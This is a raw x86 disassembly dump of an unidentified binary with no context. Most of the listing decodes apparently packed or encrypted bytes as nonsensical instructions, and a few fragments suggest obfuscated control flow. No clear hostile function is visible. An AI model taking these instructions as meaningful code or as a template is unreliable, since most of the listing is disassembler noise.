  40197d:	icebp  
  40197e:	pop    ss
  40197f:	pop    ecx
  401980:	mov    edi,gs
  401982:	adc    eax,0xc4433ec4
  401987:	je     0x401939
  401989:	adc    bh,BYTE PTR [edi+0x6cf67949]
  40198f:	pop    ss
  401990:	adc    ebp,eax
  401992:	test   al,0xbe
  401994:	jmp    0x401938
  401996:	jnp    0x401a0a
  401998:	sbb    edx,DWORD PTR [ecx+eax*2+0x5a116650]
  40199f:	into   
  4019a0:	es ins DWORD PTR es:[edi],dx
  4019a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019a3:	lock idiv BYTE PTR [esp+esi*8+0x7b4292b0]
  4019ab:	pop    esp
  4019ac:	mov    DWORD PTR [eax-0x3e],ebp
  4019af:	sub    BYTE PTR [eax],ch
  4019b1:	cmp    DWORD PTR [esi-0x42],ebp
  4019b4:	das    
  4019b5:	pop    ss
  4019b6:	jg     0x40196d
  4019b8:	fmul   QWORD PTR [ebx+0x60]
  4019bb:	or     edx,DWORD PTR [edi-0x427908de]
  4019c1:	sti    
  4019c2:	mov    edi,0x3dab940e
  4019c7:	fistp  QWORD PTR [edi+0x233bf28e]
  4019cd:	xchg   ecx,eax
  4019ce:	push   eax
  4019cf:	adc    al,0x94
  4019d1:	fwait
  4019d2:	ds ja  0x4019ed
  4019d5:	pop    ss
  4019d6:	sbb    DWORD PTR [edi+0x61],0x2d
  4019da:	inc    edx
  4019db:	aad    0xff
  4019dd:	xor    eax,0xdb335898
  4019e2:	xchg   esi,eax
  4019e3:	scas   eax,DWORD PTR es:[edi]
  4019e4:	leave  
  4019e5:	jmp    0x5fb8:0x54073231
  4019ec:	rcl    ebp,1
  4019ee:	cli    
  4019ef:	ds scas al,BYTE PTR es:[di]
  4019f2:	inc    esp
  4019f3:	jne    0x401a27
  4019f5:	stc    
  4019f6:	jo     0x401a5d
  4019f8:	stos   DWORD PTR es:[edi],eax
  4019f9:	xchg   ecx,eax
  4019fa:	and    ebp,DWORD PTR [edi+0x18]
  4019fd:	popa   
  4019fe:	or     dl,BYTE PTR [ecx+0x48]
  401a01:	popf   
  401a02:	popf   
  401a03:	mov    ebx,0x706da484
  401a08:	popa   
  401a09:	push   edi
  401a0a:	cmp    eax,DWORD PTR [edx+0x1076628b]
  401a10:	daa    
  401a11:	cwde   
  401a12:	dec    ebp
  401a13:	jmp    0x77531e80
  401a18:	jb     0x4019ea
  401a1a:	add    al,0x8f
  401a1c:	add    cl,BYTE PTR [edi+0x23]
  401a1f:	sbb    BYTE PTR [ecx+0x2d],cl
  401a22:	xor    eax,0x8f2ed92f
  401a27:	jo     0x401a0f
  401a29:	and    esi,eax
  401a2b:	ins    DWORD PTR es:[edi],dx
  401a2c:	lock leavew 
  401a2f:	je     0x4019ef
  401a31:	xchg   ecx,eax
  401a32:	or     BYTE PTR [eax-0x47da0ae5],al
  401a38:	adc    BYTE PTR [ecx],0x2c
  401a3b:	pop    edi
  401a3c:	scas   al,BYTE PTR es:[edi]
  401a3d:	cs xchg edx,eax
  401a3f:	mov    edi,0xc4d0286e
  401a44:	test   BYTE PTR [eax+0x72],bl
  401a47:	add    eax,0x886f2cd2
  401a4c:	or     bh,BYTE PTR [eax+0x2e]
  401a4f:	mov    esi,0x6d36eb7a
  401a54:	dec    ebp
  401a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a56:	int3   
  401a57:	sahf   
  401a58:	shl    BYTE PTR [edx],cl
  401a5a:	mov    ebx,0xb21826c7
  401a5f:	popa   
  401a60:	mov    ds:0xe907258c,al
  401a65:	xchg   edi,eax
  401a66:	sar    esp,0x90
  401a69:	cmp    al,0xdd
  401a6b:	mov    al,0xc7
  401a6d:	or     eax,DWORD PTR [ecx]
  401a6f:	xor    eax,0xf439308a
  401a74:	dec    edi
  401a75:	sbb    eax,0xb05d890e
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	push   edx
  401a8c:	push   0xffffffcf
  401a8e:	mov    dh,0xe
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a37
  401a98:	addr16 jae 0x401a3b
  401a9b:	outs   dx,DWORD PTR ds:[esi]
  401a9c:	cmp    ah,al
  401a9e:	test   BYTE PTR [esi+0x5b86caa7],bh
  401aa4:	lock xor eax,0x3f2312bd
  401aaa:	test   DWORD PTR [ecx-0x64d530da],edi
  401ab0:	dec    edx
  401ab1:	ins    BYTE PTR es:[edi],dx
  401ab2:	test   al,0x7e
  401ab4:	mov    BYTE PTR [edx+0x73483953],bl
  401aba:	je     0x401aa7
  401abc:	inc    edi
  401abd:	ja     0x401ace
  401abf:	rcl    BYTE PTR [edi*4+0x448ab4bb],cl
  401ac6:	sbb    cl,ah
  401ac8:	loop   0x401a7d
  401aca:	mov    eax,ds:0x9cc4d889
  401acf:	lods   eax,DWORD PTR ds:[esi]
  401ad0:	sbb    BYTE PTR [ebp+0x550a4809],ch
  401ad6:	fcomi  st,st(5)
  401ad8:	jmp    0x1dfbe7db
  401add:	dec    edx
  401ade:	inc    ebp
  401adf:	pop    ebp
  401ae0:	push   cs
  401ae1:	mov    ecx,0x7ec97033
  401ae6:	lods   eax,DWORD PTR ds:[esi]
  401ae7:	xchg   ecx,eax
  401ae8:	dec    DWORD PTR [esi-0xde93628]
  401aee:	xchg   esi,eax
  401aef:	cmp    DWORD PTR [ecx-0x78b98706],edx
  401af5:	(bad)  
  401af6:	sub    dh,BYTE PTR [eax-0x64]
  401af9:	pop    esi
  401afa:	mov    edx,DWORD PTR [ecx+edi*2+0xe]
  401afe:	and    DWORD PTR [edx-0x75183e75],ecx
  401b04:	std    
  401b05:	push   eax
  401b06:	sub    eax,0xcc174f65
  401b0b:	pop    ecx
  401b0c:	mov    dh,0xb6
  401b0e:	ret    
  401b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b10:	daa    
  401b11:	cmc    
  401b12:	mov    esp,0xfad6be9c
  401b17:	popa   
  401b18:	jbe    0x401ad5
  401b1a:	sbb    eax,0xea1b4633
  401b1f:	outs   dx,DWORD PTR ds:[esi]
  401b20:	xchg   esp,eax
  401b21:	dec    esi
  401b22:	loop   0x401b36
  401b24:	fs or  al,0x3d
  401b27:	jle    0x401b43
  401b29:	fnstsw WORD PTR [eax-0x72]
  401b2c:	arpl   WORD PTR [ecx],bx
  401b2e:	jge    0x401b94
  401b30:	xchg   DWORD PTR [esi+0x73],esp
  401b33:	stos   DWORD PTR es:[edi],eax
  401b34:	enter  0xddc7,0x99
  401b38:	inc    ebp
  401b39:	inc    ebp
  401b3a:	fiadd  DWORD PTR [ebp+0x460fa3b7]
  401b40:	jns    0x401ba8
  401b42:	push   0x22
  401b44:	les    eax,FWORD PTR [ecx-0x6f]
  401b47:	and    BYTE PTR [eax-0x8],0x43
  401b4b:	retf   0x5d34
  401b4e:	js     0x401bc5
  401b50:	call   FWORD PTR [ebx]
  401b52:	mov    ds:0x98bdad0d,al
  401b57:	ror    BYTE PTR [eax-0x11],cl
  401b5a:	lds    esi,FWORD PTR ds:0x18a8a182
  401b60:	adc    al,bl
  401b62:	mov    eax,ds:0x8e114a8f
  401b67:	arpl   WORD PTR [edi+0x4e],dx
  401b6a:	sbb    BYTE PTR [eax],bh
  401b6c:	xchg   BYTE PTR [eax-0x6a986265],dl
  401b72:	and    esp,edx
  401b74:	dec    BYTE PTR [eax+0x48]
  401b77:	mov    al,ds:0xcd4f4107
  401b7c:	test   DWORD PTR [ecx-0x7b],ebx
  401b7f:	mov    ds:0x4474f8be,al
  401b84:	inc    edi
  401b85:	pop    esp
  401b86:	adc    DWORD PTR [eax-0x7],0x6a
  401b8a:	sbb    DWORD PTR ds:[esi-0x56164e13],0x34
  401b92:	pushf  
  401b93:	ret    0x6a6
  401b96:	sub    dl,0x60
  401b99:	push   ebp
  401b9a:	test   al,0x74
  401b9c:	daa    
  401b9d:	fscale 
  401b9f:	imul   ebx,DWORD PTR [esi+0x2530c93],0xf48ef50e
  401ba9:	js     0x401be0
  401bab:	push   DWORD PTR [edx+0x53]
  401bae:	retf   
  401baf:	xchg   ebx,eax
  401bb0:	cmc    
  401bb1:	stos   BYTE PTR es:[edi],al
  401bb2:	jmp    0x59d1cc26
  401bb7:	sahf   
  401bb8:	clc    
  401bb9:	inc    ecx
  401bba:	and    DWORD PTR [ecx+0x5b],0x36db24f9
  401bc1:	fwait
  401bc2:	popa   
  401bc3:	sar    dh,1
  401bc5:	cld    
  401bc6:	cmp    al,0xc2
  401bc8:	stc    
  401bc9:	mov    eax,0x79f0d4b6
  401bce:	push   esp
  401bcf:	ficom  WORD PTR [ecx]
  401bd1:	out    dx,eax
  401bd2:	push   cs
  401bd3:	ds xchg ebp,eax
  401bd5:	or     al,0xbb
  401bd7:	leave  
  401bd8:	mov    dl,0x83
  401bda:	lock adc ch,al
  401bdd:	dec    ebp
  401bde:	dec    ebp
  401bdf:	fsub   DWORD PTR [ecx-0x5e1cd4f3]
  401be6:	js     0x401b97
  401be8:	into   
  401be9:	mov    ebp,0x42d62ef8
  401bee:	clc    
  401bef:	jp     0x401b74
  401bf1:	mov    edi,0xf41bffe
  401bf6:	mov    ecx,0xb9aaf93f
  401bfb:	leave  
  401bfc:	call   0xc344:0x7f2bb42b
  401c03:	std    
  401c04:	mov    ds:0xd15a21ad,al
  401c09:	inc    eax
  401c0a:	mov    BYTE PTR [ecx],bl
  401c0c:	adc    al,0xd5
  401c0e:	js     0x401c19
  401c10:	inc    ebp
  401c11:	cdq    
  401c12:	popa   
  401c13:	arpl   sp,sp
  401c15:	iret   
  401c16:	hlt    
  401c17:	scas   eax,DWORD PTR es:[edi]
  401c18:	sub    BYTE PTR [edi+edi*8-0x75],ch
  401c1c:	inc    ebp
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	leave  
  401c41:	and    eax,0x798a7913
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c25
  401c4d:	inc    esp
  401c4e:	test   cl,0x70
  401c51:	pop    ebp
  401c52:	lock rol BYTE PTR [edi],cl
  401c55:	retf   0x9fbf
  401c58:	imul   BYTE PTR [eax]
  401c5a:	(bad)  
  401c5b:	adc    eax,0xedfb6d4c
  401c60:	outs   dx,BYTE PTR ds:[esi]
  401c61:	or     eax,DWORD PTR [edi+0x19]
  401c64:	mov    edi,0x975f1f03
  401c69:	pop    ss
  401c6a:	aaa    
  401c6b:	jne    0x401ca7
  401c6d:	adc    BYTE PTR [ebp+0x58444119],dl
  401c73:	xchg   edi,eax
  401c74:	jmp    0xf552:0xd94191fa
  401c7b:	(bad)  
  401c7c:	fmul   DWORD PTR [edx-0x7f6449f9]
  401c82:	pop    ebp
  401c83:	loop   0x401c93
  401c85:	mov    esp,DWORD PTR [edx-0x3213981c]
  401c8b:	int    0x34
  401c8d:	sbb    eax,0x2757fea2
  401c92:	and    eax,0xd5e089dd
  401c97:	lahf   
  401c98:	arpl   WORD PTR ds:0x208b40d7,bp
  401c9e:	jne    0x401cb9
  401ca0:	sbb    al,BYTE PTR [edx+ebp*4]
  401ca3:	iret   
  401ca4:	inc    edx
  401ca5:	mov    WORD PTR [edi],ds
  401ca7:	mov    DWORD PTR [ecx-0x27d1ff0],0x3f09bf59
  401cb1:	sbb    dh,BYTE PTR [eax]
  401cb3:	or     eax,0xa0413a22
  401cb8:	or     al,0x32
  401cba:	pop    edx
  401cbb:	test   BYTE PTR [ecx],bh
  401cbd:	lock push ss
  401cbf:	test   BYTE PTR [ecx-0x1fb6c695],dl
  401cc5:	ins    DWORD PTR es:[edi],dx
  401cc6:	pop    ds
  401cc7:	fisttp QWORD PTR [edi]
  401cc9:	shl    DWORD PTR [esp+edi*4-0x1e5be32b],1
  401cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd1:	mov    ecx,0x23e9b5cb
  401cd6:	push   edi
  401cd7:	lock add DWORD PTR [ebx],eax
  401cda:	call   0x5e564080
  401cdf:	push   ss
  401ce0:	dec    ecx
  401ce1:	mov    WORD PTR [ecx-0x28],ds
  401ce4:	stc    
  401ce5:	xor    eax,0xe2bd2c2d
  401cea:	mov    cl,0xbc
  401cec:	mov    ebx,?
  401cee:	mov    dl,0x33
  401cf0:	dec    esi
  401cf1:	pushf  
  401cf2:	mov    ds:0x8c3843e4,eax
  401cf7:	fild   DWORD PTR [esi-0x2e]
  401cfa:	jno    0x401d6b
  401cfc:	xor    eax,0xe6c17ab1
  401d01:	fwait
  401d02:	and    ecx,DWORD PTR [eax+0x62a03b8f]
  401d08:	sub    DWORD PTR ds:0x167aaaa8,0xffffffbb
  401d0f:	sahf   
  401d10:	idiv   DWORD PTR [eax-0x75]
  401d13:	fimul  WORD PTR [edx]
  401d15:	ds push edi
  401d17:	in     al,0x46
  401d19:	adc    ch,BYTE PTR [esi]
  401d1b:	iret   
  401d1c:	(bad)
  401d20:	call   0xacbed72a
  401d25:	ret    0xd45c
  401d28:	popa   
  401d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d2a:	jae    0x401d4b
  401d2c:	ret    0xfc44
  401d2f:	and    esp,DWORD PTR [ebx+0x3c8e6959]
  401d35:	fdiv   QWORD PTR ds:0xad510c9e
  401d3b:	inc    esi
  401d3c:	or     DWORD PTR ds:0xfd6e6c35,esi
  401d42:	lods   al,BYTE PTR ds:[esi]
  401d43:	pop    esi
  401d44:	push   edi
  401d45:	sbb    al,0x10
  401d47:	ins    DWORD PTR es:[edi],dx
  401d48:	sbb    eax,DWORD PTR [ecx]
  401d4a:	or     al,0xb5
  401d4c:	or     bh,BYTE PTR ds:0xac62fbc6
  401d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d53:	ret    0x998b
  401d56:	mov    eax,ds:0x509d2ea2
  401d5b:	add    al,0x62
  401d5d:	out    0xd1,al
  401d5f:	jbe    0x401d11
  401d61:	sbb    bl,0xcd
  401d64:	nop
  401d65:	pop    ecx
  401d66:	cmp    al,BYTE PTR [edi]
  401d68:	(bad)  
  401d69:	adc    cl,BYTE PTR [ebp-0x76]
  401d6c:	mov    DWORD PTR [ebx+esi*1+0x669d7409],ebx
  401d73:	rcr    BYTE PTR [edi+ebx*2],cl
  401d76:	xchg   ecx,eax
  401d77:	sbb    DWORD PTR [ebx+eiz*4+0x479e2107],eax
  401d7e:	xchg   ecx,eax
  401d7f:	ss stos BYTE PTR es:[edi],al
  401d81:	jae    0x401de1
  401d83:	lock hlt 
  401d85:	mov    esp,0x31185d6d
  401d8a:	lods   eax,DWORD PTR ds:[esi]
  401d8b:	out    dx,al
  401d8c:	iret   
  401d8d:	sbb    eax,0x490a7c41
  401d92:	inc    ebp
  401d93:	inc    esp
  401d94:	jne    0x401e0f
  401d96:	sbb    BYTE PTR [ebx+0x3d],ah
  401d99:	neg    BYTE PTR [ecx-0x5cc0e55d]
  401d9f:	fcmovnbe st,st(0)
  401da1:	inc    ebx
  401da2:	cmovno edx,DWORD PTR [eax+eiz*8+0x37]
  401da7:	jbe    0x401d8b
  401da9:	sbb    ebp,DWORD PTR [ebp+0x56541b05]
  401daf:	dec    eax
  401db0:	call   0x7a66:0x37342979
  401db7:	and    eax,0x9b318d11
  401dbc:	jecxz  0x401d50
  401dbe:	cli    
  401dbf:	and    DWORD PTR [esi],esp
  401dc1:	iret   
  401dc2:	cmp    DWORD PTR [esi],0x52
  401dc5:	jg     0x401d91
  401dc7:	out    dx,eax
  401dc8:	int    0xd4
  401dca:	mov    ds:0xe961d6d2,eax
  401dcf:	add    eax,0x4189c703
  401dd4:	add    al,0x8b
  401dd6:	inc    ebp
  401dd7:	aam    0x8b
  401dd9:	dec    ebp
  401dda:	clc    
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x47f30038],ebp
  401e0d:	and    dl,BYTE PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dd9
  401e17:	das    
  401e18:	cdq    
  401e19:	nop
  401e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1b:	xchg   edi,eax
  401e1c:	mov    bl,0x7e
  401e1e:	ja     0x401e52
  401e20:	mov    bp,0x3bdf
  401e24:	cmp    ecx,DWORD PTR [edi]
  401e26:	les    edi,FWORD PTR [edi-0x68d5939b]
  401e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e2d:	mov    dh,dh
  401e2f:	fstp   TBYTE PTR [ebx]
  401e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e32:	rcl    DWORD PTR ds:0xd52c8469,0x2
  401e39:	push   eax
  401e3a:	loope  0x401ddd
  401e3c:	in     eax,0xc2
  401e3e:	sub    BYTE PTR [eax+0x7ac19ac0],ah
  401e44:	(bad)  
  401e45:	ret    
  401e46:	or     dh,BYTE PTR [esi]
  401e48:	pop    edx
  401e49:	pop    es
  401e4a:	or     al,0x91
  401e4c:	dec    esi
  401e4d:	pmulhw mm1,QWORD PTR [edx]
  401e50:	lahf   
  401e51:	push   0x8d9d91c5
  401e56:	xchg   esi,esi
  401e58:	inc    ecx
  401e59:	shl    BYTE PTR [eax],0x78
  401e5c:	jnp    0x401e7d
  401e5e:	xor    bl,BYTE PTR [esi+0x23a3b29a]
  401e64:	cli    
  401e65:	mov    eax,ds:0x798249c
  401e6a:	jg     0x401ea3
  401e6c:	or     al,0x1d
  401e6e:	dec    edi
  401e6f:	mov    DWORD PTR [edi+0x7dbfec9],eax
  401e75:	push   edi
  401e76:	scas   eax,DWORD PTR es:[edi]
  401e77:	mov    ds:0xd2677fcf,eax
  401e7c:	adc    eax,0x62605800
  401e81:	fistp  DWORD PTR [edi+0x466659c]
  401e87:	xor    edx,eax
  401e89:	sbb    al,0xd7
  401e8b:	aad    0x3
  401e8d:	fbld   TBYTE PTR ds:0x96a6584d
  401e93:	xchg   ebp,eax
  401e94:	fadd   DWORD PTR [ecx-0x16]
  401e97:	inc    eax
  401e98:	test   al,0xca
  401e9a:	pop    edx
  401e9b:	daa    
  401e9c:	outs   dx,BYTE PTR ds:[esi]
  401e9d:	in     al,dx
  401e9e:	xlat   BYTE PTR ds:[ebx]
  401e9f:	into   
  401ea0:	xor    ch,0x6d
  401ea3:	cdq    
  401ea4:	pop    ss
  401ea5:	xchg   ebp,eax
  401ea6:	dec    eax
  401ea7:	xchg   ecx,eax
  401ea8:	loope  0x401e40
  401eaa:	in     al,dx
  401eab:	lea    ebx,[edi-0x1f7053bf]
  401eb1:	and    eax,0x7d03d789
  401eb6:	cmc    
  401eb7:	iret   
  401eb8:	adc    eax,0xad8e4e99
  401ebd:	rcl    DWORD PTR [ecx+0x9],1
  401ec0:	dec    esp
  401ec1:	xchg   edi,eax
  401ec2:	ret    0xea79
  401ec5:	add    cl,BYTE PTR [edi+0x20]
  401ec8:	pop    esp
  401ec9:	sbb    dl,BYTE PTR [edi-0x9]
  401ecc:	inc    edi
  401ecd:	js     0x401f06
  401ecf:	lds    edx,FWORD PTR [ebx-0x54]
  401ed2:	lock push ecx
  401ed4:	arpl   WORD PTR gs:[ebx-0x12a8fca2],bp
  401edb:	sub    DWORD PTR [edx],ecx
  401edd:	ror    esi,0x35
  401ee0:	cmp    ah,BYTE PTR [ecx-0x2e]
  401ee3:	sbb    eax,0x4c228678
  401ee8:	xor    ebx,esi
  401eea:	pop    es
  401eeb:	xchg   BYTE PTR [ecx+0x7e2b7d82],bh
  401ef1:	mov    edi,0xf9ded987
  401ef6:	mov    esp,0x72d6488f
  401efb:	pusha  
  401efc:	out    dx,al
  401efd:	(bad)  
  401efe:	out    0x8a,eax
  401f00:	pop    esp
  401f01:	(bad)  
  401f02:	dec    ebp
  401f03:	adc    al,0xb8
  401f05:	inc    ebx
  401f06:	inc    eax
  401f07:	jp     0x401eb0
  401f09:	inc    esi
  401f0a:	icebp  
  401f0b:	dec    edx
  401f0c:	dec    edi
  401f0d:	push   ebx
  401f0e:	jp     0x401f72
  401f10:	pop    ss
  401f11:	adc    al,0x6
  401f13:	sahf   
  401f14:	pop    ss
  401f15:	sbb    eax,0x19a14862
  401f1a:	pop    edx
  401f1b:	bnd jg 0x401ee8
  401f1e:	jg     0x401eb9
  401f20:	outs   dx,DWORD PTR ds:[esi]
  401f21:	pop    esi
  401f22:	jp     0x401ee8
  401f24:	jno    0x401f4d
  401f26:	jnp    0x401eaa
  401f28:	sbb    DWORD PTR [ebp-0x20],edi
  401f2b:	out    dx,al
  401f2c:	popf   
  401f2d:	jl     0x401f22
  401f2f:	mov    esi,0xe1c98f2d
  401f34:	adc    eax,0x399edbce
  401f39:	loop   0x401ed8
  401f3b:	leave  
  401f3c:	adc    BYTE PTR [ebp+0x79d4ab98],cl
  401f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f43:	sbb    DWORD PTR [ecx+0x6cd0f16c],esi
  401f49:	test   DWORD PTR [ecx],esp
  401f4b:	iret   
  401f4c:	xchg   edi,eax
  401f4d:	push   ecx
  401f4e:	cmp    BYTE PTR [eax],0xbe
  401f51:	ss or  esp,0x15
  401f55:	pop    edi
  401f56:	imul   esi,DWORD PTR [eax-0x60],0xe8b07a52
  401f5d:	pop    eax
  401f5e:	mov    ah,bl
  401f60:	cs inc edi
  401f62:	add    BYTE PTR [ebx+0x45],ch
  401f65:	cmp    edx,DWORD PTR [ebp+edi*2+0x61]
  401f69:	int3   
  401f6a:	mov    DWORD PTR [esi-0x7202fc7f],esi
  401f70:	xor    eax,0x952306c7
  401f75:	adc    DWORD PTR [edi+0x74f08d9d],edi
  401f7b:	stc    
  401f7c:	sahf   
  401f7d:	frstpm(287 only) 
  401f7f:	or     al,0x49
  401f81:	cmp    ecx,ebp
  401f83:	pop    eax
  401f84:	in     al,0x78
  401f86:	jmp    0x401f28
  401f88:	xchg   ecx,eax
  401f89:	pushf  
  401f8a:	mov    eax,ds:0x7850577f
  401f8f:	cli    
  401f90:	dec    ebx
  401f91:	and    eax,0xe1da97d3
  401f96:	mov    ds,eax
  401f98:	xchg   edi,eax
  401f99:	fwait
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xd86b5f80
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fc7
  401fcc:	gs popf 
  401fce:	mov    eax,0xa763e10d
  401fd3:	clc    
  401fd4:	add    dl,BYTE PTR [ebx+0x3a583fd7]
  401fda:	pop    es
  401fdb:	shl    DWORD PTR [esi-0x11],cl
  401fde:	bound  esi,QWORD PTR [esi+edx*8+0x32ba2351]
  401fe5:	dec    esp
  401fe6:	test   al,0x64
  401fe8:	aad    0xce
  401fea:	inc    ebp
  401feb:	push   esi
  401fec:	dec    edx
  401fed:	cmp    BYTE PTR [edi+esi*2+0x76612cad],bl
  401ff4:	jmp    0xf557:0x4937be6d
  401ffb:	push   eax
  401ffc:	daa    
  401ffd:	fdiv   QWORD PTR [ebx+0x7796b56e]
  402003:	xor    eax,0x49bfd871
  402008:	stc    
  402009:	fwait
  40200a:	xor    eax,0x3e5fff0d
  40200f:	sbb    al,0x40
  402011:	xchg   ebp,eax
  402012:	or     eax,0x7da58958
  402017:	ds gs xor al,0x90
  40201b:	ds push esp
  40201d:	mov    edx,0xacb93009
  402022:	mov    dl,0x2c
  402024:	cld    
  402025:	fdiv   DWORD PTR [eax-0x27f41018]
  40202b:	inc    edx
  40202c:	jecxz  0x40201a
  40202e:	xor    eax,0xb95f8380
  402033:	and    al,0x5a
  402035:	dec    esi
  402036:	xor    bl,BYTE PTR [ebp-0x44]
  402039:	mov    ds:0xd8bdc032,al
  40203e:	ja     0x40208e
  402040:	daa    
  402041:	jnp    0x40205f
  402043:	mov    ds:0x334b6a79,eax
  402048:	adc    DWORD PTR [eax],ecx
  40204a:	xor    eax,0x4d1b486
  40204f:	imul   edx,DWORD PTR [ebp-0x65],0x748d6f6a
  402056:	jmp    0x9c8a981e
  40205b:	repz add eax,0x4afbc264
  402061:	and    bh,dh
  402063:	and    ch,BYTE PTR [edi+0x3f08256e]
  402069:	fdiv   st(2),st
  40206b:	arpl   WORD PTR [ebp+0x73c64de1],si
  402071:	push   edx
  402072:	lods   al,BYTE PTR ds:[esi]
  402073:	lock push edi
  402075:	or     eax,0xe0d8835a
  40207a:	mov    al,0x74
  40207c:	rcl    DWORD PTR [eax-0x3f],1
  40207f:	mov    dh,0x81
  402081:	push   esi
  402082:	jmp    0x8d31fc10
  402087:	in     al,dx
  402088:	adc    BYTE PTR [ebx+0x52],dh
  40208b:	nop
  40208c:	inc    ebx
  40208d:	scas   al,BYTE PTR es:[edi]
  40208e:	ins    BYTE PTR es:[edi],dx
  40208f:	rcr    BYTE PTR [ebx-0x20],0xf1
  402093:	xor    DWORD PTR [edi],0xffffffe0
  402096:	cmp    DWORD PTR [ebx+edi*2-0x1f],ebx
  40209a:	aad    0x1d
  40209c:	call   0x25fd:0x574f2107
  4020a3:	inc    esi
  4020a4:	out    0xa1,eax
  4020a6:	cmp    al,0xd3
  4020a8:	pushf  
  4020a9:	push   cs
  4020aa:	sub    ch,dh
  4020ac:	out    0x7,eax
  4020ae:	scas   eax,DWORD PTR es:[edi]
  4020af:	addr16 mov cl,0x8
  4020b2:	dec    ebp
  4020b3:	outs   dx,BYTE PTR ds:[esi]
  4020b4:	mov    ch,0xe4
  4020b6:	aad    0xe1
  4020b8:	fimul  WORD PTR [eax]
  4020ba:	div    BYTE PTR [ebx]
  4020bc:	test   eax,0x1be0802a
  4020c1:	aas    
  4020c2:	xchg   ebp,eax
  4020c3:	es pop edi
  4020c5:	adc    al,0xeb
  4020c7:	push   cs
  4020c8:	arpl   di,di
  4020ca:	adc    edi,esp
  4020cc:	jno    0x40206c
  4020ce:	sub    edx,DWORD PTR [esp+ebp*8]
  4020d1:	jne    0x40214d
  4020d3:	push   eax
  4020d4:	cmp    eax,0xedca2aa4
  4020d9:	jg     0x4020fb
  4020db:	shr    BYTE PTR [edi+0x11],cl
  4020de:	cdq    
  4020df:	add    al,0x2a
  4020e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020e2:	adc    eax,edi
  4020e4:	test   al,0xeb
  4020e6:	fcom   QWORD PTR [ebp+0x42]
  4020e9:	adc    ebp,DWORD PTR [ecx]
  4020eb:	jg     0x40208b
  4020ed:	inc    eax
  4020ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020ef:	cdq    
  4020f0:	xchg   DWORD PTR [edi-0x3eefc3f0],edx
  4020f6:	cld    
  4020f7:	aad    0xd1
  4020f9:	or     ecx,DWORD PTR [edi]
  4020fb:	call   0xc9286c07
  402100:	fld    QWORD PTR [ecx-0x2d]
  402103:	scas   al,BYTE PTR es:[edi]
  402104:	mov    ebx,DWORD PTR [esi+0x7dd4d106]
  40210a:	repnz (bad) 
  40210c:	test   esp,0x90d6b8d
  402112:	and    bl,bl
  402114:	ds cmp al,0x6d
  402117:	mov    edx,0x800a538
  40211c:	inc    edi
  40211d:	jp     0x402153
  40211f:	ret    0xe406
  402122:	sbb    al,0x59
  402124:	push   cs
  402125:	lds    ecx,FWORD PTR [eax+0x25]
  402128:	fdivr  DWORD PTR [eax+0x159bc030]
  40212e:	retf   0x786d
  402131:	pop    ss
  402132:	ins    DWORD PTR es:[edi],dx
  402133:	xchg   ebp,eax
  402134:	jmp    0x4dfcc98b
  402139:	sbb    DWORD PTR [ecx+eiz*1+0x3bf2e493],0xffffffbd
  402141:	cli    
  402142:	cmp    bl,BYTE PTR es:[ecx+0x7c3db127]
  402149:	cwde   
  40214a:	shl    dl,0x3d
  40214d:	scas   al,BYTE PTR es:[edi]
  40214e:	xchg   edi,eax
  40214f:	push   eax
